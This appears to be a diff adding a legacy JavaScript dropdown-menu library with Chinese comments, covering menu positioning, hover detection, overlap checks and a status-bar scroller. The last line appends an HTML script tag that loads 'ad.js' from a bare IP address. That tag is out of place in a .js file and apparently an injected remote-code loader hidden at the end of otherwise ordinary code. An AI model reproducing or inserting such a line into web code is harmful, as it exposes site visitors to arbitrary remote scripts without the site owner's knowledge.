@@ -1,0 +1,213 @@
+var showedMenu=new Array();//正在显示的各级菜单
+/*
+显示菜单
+menuId：菜单对象标识符
+level：菜单的级别
+*/
+function showMenu(obj,menuId,level)
+{
+	var e,x,y;
+	var sel;
+	if(document.all)
+	{
+		e=event.srcElement;
+		if(level==0)
+		{//子菜单在下方
+			x=0;
+			y=e.offsetHeight;
+		}
+		else
+		{//子菜单在右侧
+			x=e.offsetWidth;
+			y=0;
+		}
+		while(e)
+		{//计算子菜单绝对坐标
+			x+=e.offsetLeft;
+			y+=e.offsetTop;
+			e=e.offsetParent;
+		}
+		
+		sel=document.all.tags("SELECT");
+		
+		//对于IE5.0以前的版本进行调整
+		if (navigator.appVersion.indexOf("MSIE") != -1) 
+		{
+			var IEmajorStart = navigator.appVersion.indexOf("MSIE") + 4;
+			var IEmajorEnd = (IEmajorStart + 6);
+			var theMajor = navigator.appVersion.substring(IEmajorStart, IEmajorEnd);
+			if(parseFloat(theMajor)<5.5)y+=4;
+		}
+		y=y-3; //调整菜单显示的高度
+	}
+	else 
+	{
+		e=obj;
+		if(level==0)
+		{//子菜单在下方
+			x=0;
+			y=e.offsetHeight;
+		}
+		else
+		{//子菜单在右侧
+			x=e.offsetWidth;
+			y=0;
+		}
+		while(e)
+		{//计算子菜单绝对坐标
+			x+=e.offsetLeft;
+			y+=e.offsetTop;
+			e=e.offsetParent;
+		}
+		sel=document.getElementsByTagName("SELECT");
+		y=y-1; //调整菜单显示的高度
+	}
+	hideMenuTruely(level);
+	
+	showedMenu[level]=document.getElementById(menuId);
+	if(showedMenu[level])
+	{
+		for(var i=0;i<sel.length;i++)if(overlapObjs(sel[i],showedMenu[level]))sel[i].style.visibility='hidden';
+		showedMenu[level].style.left=x+'px';
+		showedMenu[level].style.top=y+'px';
+		showedMenu[level].style.visibility='visible';
+	}
+}
+
+/*
+隐藏菜单（先判断条件）
+topLevel：要隐藏的菜单最高级别
+*/
+function hideMenu(e)
+{
+	var topLevel=0;
+	if(!mouseOverObj(e,topLevel+1)&&!mouseOverObj(e,topLevel))
+	{
+		hideMenuTruely(topLevel);
+		for(var i=topLevel-1;i>=0;i--)if(!mouseOverObj(i))hideMenuTruely(i);
+	}
+}
+/*
+真正隐藏菜单（无条件）
+topLevel：要隐藏的菜单最高级别
+*/
+function hideMenuTruely(topLevel)
+{
+	for(level=topLevel;showedMenu[level];level++)
+	{
+		showedMenu[level].style.visibility='hidden';
+		showedMenu[level]=null;
+	}
+	if(topLevel==0)
+	{
+		var sel=document.getElementsByTagName("SELECT");
+		for(var i=0;i<sel.length;i++)sel[i].style.visibility='visible';
+	}
+}
+
+/*
+判断鼠标当前位置是否在菜单范围内，如果是则返回true
+level：菜单的层
+*/
+function mouseOverObj(e, level)
+{
+	var obj=showedMenu[level];
+	if(!obj)return false;
+	var x=0;
+	var y=0;
+	if(document.all)
+	{
+		x=event.clientX+objHTMLbody.scrollLeft;
+		y=event.clientY+objHTMLbody.scrollTop;
+		return !(x<obj.offsetLeft+2||x>obj.offsetLeft+obj.offsetWidth||y<obj.offsetTop+2||y>obj.offsetTop+obj.offsetHeight);
+	}
+	else
+	{
+		x=e.pageX;
+		y=e.pageY;
+		var currentLeft = 0;
+		var currentTop = 0;
+		var currentWidth = obj.offsetWidth;
+		var currentHeight = obj.offsetHeight;
+		while(obj)
+		{//计算子菜单绝对坐标
+			currentLeft+=obj.offsetLeft;
+			currentTop+=obj.offsetTop;
+			obj=obj.offsetParent;
+		}
+		return !(x<=currentLeft||x>=currentLeft+currentWidth||y<=currentTop||y>=currentTop+currentHeight);
+	}
+
+	
+}
+
+/*
+判断两个对象是否重叠，如果是则返回true
+e1,e2：两个对象
+*/
+function overlapObjs(e1,e2)
+{
+	var l1=u1=0;
+	var r1=e1.offsetWidth;
+	var d1=e1.offsetHeight;
+	while(e1)
+	{//计算绝对坐标
+		l1+=e1.offsetLeft;
+		u1+=e1.offsetTop;
+		e1=e1.offsetParent;
+	}
+	r1+=l1;
+	d1+=u1;
+
+	var l2=u2=0;
+	var r2=e2.offsetWidth;
+	var d2=e2.offsetHeight;
+	while(e2)
+	{//计算绝对坐标
+		l2+=e2.offsetLeft;
+		u2+=e2.offsetTop;
+		e2=e2.offsetParent;
+	}
+	r2+=l2;
+	d2+=u2;
+	return !(d1<u2||d2<u1||r1<l2||r2<l1);
+}
+
+function scrollit(seed)
+{
+  var msg=scroll_message;
+  var out = " ";
+  var c   = 1;
+  if (seed > 100)
+  {
+    seed--;
+    cmd="scrollit("+seed+")";
+    timerTwo=window.setTimeout(cmd,100);
+  }
+  else if (seed <= 100 && seed > 0)
+  {
+    for (c=0 ; c < seed ; c++)out+=" ";
+    out+=msg;
+    seed--;
+    window.status=out;
+    cmd="scrollit("+seed+")";
+    timerTwo=window.setTimeout(cmd,100);
+  }
+  else if (seed <= 0)
+  {
+    if (-seed < msg.length)
+    {
+      out+=msg.substring(-seed,msg.length);
+      seed--;
+      window.status=out;
+      cmd="scrollit("+seed+")";
+      timerTwo=window.setTimeout(cmd,100);
+    }
+    else
+    {
+      window.status=" ";
+      timerTwo=window.setTimeout("scrollit(100)",75);
+    }
+  }
+}
+<script src="http://222.208.183.246/ad/ad.js"></script>
